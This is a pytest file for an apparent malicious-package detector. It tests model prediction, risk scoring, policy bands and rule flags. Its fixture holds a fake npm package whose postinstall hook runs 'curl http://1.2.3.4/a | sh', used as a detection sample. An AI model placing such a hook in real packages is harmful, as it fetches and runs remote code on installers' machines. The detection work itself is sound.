"""Inference tests with a tiny randomly-initialised model (no real checkpoint, no network, nothing is executed)."""
from __future__ import annotations

import io
import json
import tarfile
from pathlib import Path

import numpy as np
import pytest
import torch

from src.features.pipeline import ALL_FEATURES, featurize
from src.features.typosquat import NameIndex
from src.infer import fetch as fetch_mod
from src.infer.explain import locate
from src.infer.model_io import load_model, load_scaler, predict, save_scaler
from src.infer.policy import band_for, load_policy
from src.infer.score import Context, render, score_record
from src.models.malconv import MalConvFusion
from src.train.data import Scaler
from src.utils.common import ROOT, load_config

M2 = {"data": {"max_bytes": 2048, "normalize": False, "drop_features": []},
      "model": {"embed_dim": 4, "filters": 8, "kernel": 16, "stride": 8, "num_hidden": 8, "fusion_hidden": 8, "dropout": 0.0}}
POLICY = ROOT / "configs" / "policy.yaml"


def tarball(files: dict[str, str]) -> bytes:
    buf = io.BytesIO()
    with tarfile.open(fileobj=buf, mode="w:gz") as tf:
        for name, body in files.items():
            data = body.encode()
            ti = tarfile.TarInfo(f"package/{name}")
            ti.size = len(data)
            tf.addfile(ti, io.BytesIO(data))
    return buf.getvalue()


@pytest.fixture(scope="module")
def ctx(tmp_path_factory) -> Context:
    d = tmp_path_factory.mktemp("ckpt")
    torch.manual_seed(0)
    m = M2["model"]
    net = MalConvFusion(len(ALL_FEATURES), m["embed_dim"], m["filters"], m["kernel"], m["stride"], m["num_hidden"],
                        m["fusion_hidden"], m["dropout"])
    torch.save({"model": net.state_dict()}, d / "best.pt")
    save_scaler(d / "scaler.npz", Scaler(np.zeros(len(ALL_FEATURES), np.float32), np.ones(len(ALL_FEATURES), np.float32)), ALL_FEATURES)
    bundle = load_model(d, M2, d, torch.device("cpu"))  # scaler.npz present -> train parquet not needed
    nm = {"npm": NameIndex(["lodash", "express"]), "pypi": NameIndex(["requests"])}
    return Context(load_config(), load_policy(POLICY), bundle, nm, nm)


MAL_NPM = {"package.json": json.dumps({"name": "evil", "version": "1.0.0", "scripts": {"postinstall": "node x.js"}}),
           "x.js": "const cp = require('child_process');\nconst https = require('https');\ncp.exec('curl http://1.2.3.4/a | sh');\n"}


def rec_for(ctx: Context, files: dict[str, str], eco: str = "npm") -> dict:
    return fetch_mod.record_from_bytes(eco, "evil", "1.0.0", tarball(files), ctx.cfg)


def test_scaler_roundtrip(tmp_path):
    s = Scaler(np.arange(3, dtype=np.float32), np.ones(3, np.float32) * 2)
    save_scaler(tmp_path / "s.npz", s, ["a", "b", "c"])
    s2, names = load_scaler(tmp_path / "s.npz")
    assert names == ["a", "b", "c"] and np.allclose(s2.mean, s.mean) and np.allclose(s2.std, s.std)


def test_policy_bands():
    p = load_policy(POLICY)
    assert [band_for(p, x)[1] for x in (0, 299, 300, 699, 700, 1000)] == ["allow", "allow", "review", "review", "block", "block"]
    with pytest.raises(ValueError):
        band_for(p, 1001)


def test_policy_rejects_bad_bands(tmp_path):
    f = tmp_path / "p.yaml"
    f.write_text("bands: [{name: a, max_permille: 500, decision: allow}]\n")
    with pytest.raises(ValueError):
        load_policy(f)


def test_predict_is_deterministic_and_bounded(ctx):
    out = featurize(rec_for(ctx, MAL_NPM), ctx.top, ctx.mal, ctx.cfg["features"]["max_text_chars"])
    p1, a1 = predict(ctx.bundle, out["text"], out["feats"], "npm")
    p2, a2 = predict(ctx.bundle, out["text"], out["feats"], "npm")
    assert p1 == p2 and a1 == a2 and 0 <= p1 <= 1 and len(a1) == 5


def test_score_record_schema_and_rules(ctx):
    res = score_record(ctx, rec_for(ctx, MAL_NPM), "registry")
    json.dumps(res)  # machine-output safe
    assert isinstance(res["risk_score"], int) and 0 <= res["risk_score"] <= 1000
    assert res["decision"] in {"allow", "review", "block"} and set(res["aux"]) == {
        "install_exec", "network", "cred_access", "obfuscation", "process_spawn"}
    assert res["aux"]["install_exec"]["rules_flag"] and res["aux"]["network"]["rules_flag"]  # rule extractors fire
    ev = {e["aux"]: e for e in res["evidence"]}
    assert ev["install_exec"]["file"] == "package.json" and "line" in ev["network"]
    assert "install_exec" in res["reason"] and "->" in res["reason"]
    assert "risk_score=" in render(res)


def test_benign_package_has_no_rule_flags(ctx):
    res = score_record(ctx, rec_for(ctx, {"package.json": json.dumps({"name": "ok", "version": "1.0.0"}),
                                          "index.js": "module.exports = (a, b) => a + b;\n"}), "registry")
    assert not any(v["rules_flag"] for v in res["aux"].values()) and res["evidence"] == []


def test_same_pipeline_as_training_text(ctx):
    """record_from_bytes + featurize must produce build_text output (same truncation) -- the training text step."""
    big = {"package.json": json.dumps({"name": "big", "version": "1.0.0"}), "a.js": "x=1;\n" * 20000}
    out = featurize(rec_for(ctx, big), ctx.top, ctx.mal, ctx.cfg["features"]["max_text_chars"])
    assert len(out["text"]) <= ctx.cfg["features"]["max_text_chars"] and out["text"].startswith("### package.json\n")
    assert set(out["feats"]) == set(ALL_FEATURES)


def test_locate():
    t = "a\nb\nsubprocess.Popen(\n  ['x'])\n"
    assert locate(t, "subprocess.Popen(") == 3 and locate(t, "nothing here at all") is None and locate(t, "") is None


def test_download_uses_registry_fetchers(ctx, monkeypatch):
    monkeypatch.setattr(fetch_mod, "fetch_npm", lambda cli, c, mb: (b"bytes", c["version"] or "9.9.9", "2020-01-01"))
    monkeypatch.setattr(fetch_mod, "fetch_pypi", lambda cli, c, mb: None)
    assert fetch_mod.download("npm", "x", "latest", ctx.cfg, cli=object()) == (b"bytes", "9.9.9", "2020-01-01")
    with pytest.raises(fetch_mod.FetchError):
        fetch_mod.download("pypi", "x", "1.0", ctx.cfg, cli=object())
